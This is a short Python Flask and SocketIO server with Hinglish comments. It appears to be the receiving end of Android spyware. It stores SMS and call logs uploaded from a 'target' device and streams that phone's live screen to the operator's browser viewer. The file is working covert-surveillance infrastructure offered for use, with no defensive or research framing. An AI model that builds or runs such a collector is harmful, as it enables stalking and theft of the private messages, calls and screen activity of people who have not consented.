from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO, emit
import os

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

UPLOAD_DIR = "target_data"
os.makedirs(os.path.join(UPLOAD_DIR, "sms"), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_DIR, "calls"), exist_ok=True)

# Web Viewer page jahan tu browser mein live screen dekh sakega
@app.route('/')
def index():
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Live Screen Viewer</title>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
        </head>
        <body>
            <h2>Live Screen Stream</h2>
            <img id="screenStream" style="width:100%; max-width:400px; border:2px solid black;" />
            <script>
                var socket = io();
                socket.on('screen_frame', function(data) {
                    document.getElementById('screenStream').src = 'data:image/jpeg;base64,' + data.image;
                });
            </script>
        </body>
        </html>
    ''')

# SMS aur Call Logs receive karne ka API endpoint
@app.route('/api/upload_logs', methods=['POST'])
def upload_logs():
    data = request.json
    device_id = data.get('device_id', 'unknown_device')
    log_type = data.get('type', 'general') # 'sms' ya 'calls'
    content = data.get('content', [])
    
    print(f"[{log_type.upper()}] Received {len(content)} items from Device ID: {device_id}")
    return jsonify({"status": "success", "message": "Logs received successfully"}), 200

# Android App se live screen frames receive karke web viewer par bhejna
@socketio.on('video_frame')
def handle_video_frame(data):
    # Frame ko sabhi connected viewers (jaise tera browser) par broadcast kar do
    emit('screen_frame', {'image': data['image']}, broadcast=True)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)
    
